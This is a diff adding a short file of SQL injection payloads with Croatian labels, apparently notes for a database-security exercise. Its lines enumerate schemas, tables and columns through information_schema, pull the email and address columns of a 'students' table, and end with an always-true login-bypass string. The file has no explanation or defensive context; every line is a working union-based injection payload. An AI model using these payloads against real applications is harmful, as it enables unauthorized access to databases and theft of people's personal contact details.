@@ -1,0 +1,11 @@
+ime schema: ' UNION SELECT schema_name, null FROM information_schema.schemata--
+
+ime tablice: ' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 'public'--
+
+imena stupaca: ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'students'--
+
+dohvati email: ' UNION SELECT email, null FROM students--
+
+dohvati adresu: ' UNION SELECT address, null FROM students--
+
+tauntologija: ' OR '1'='1
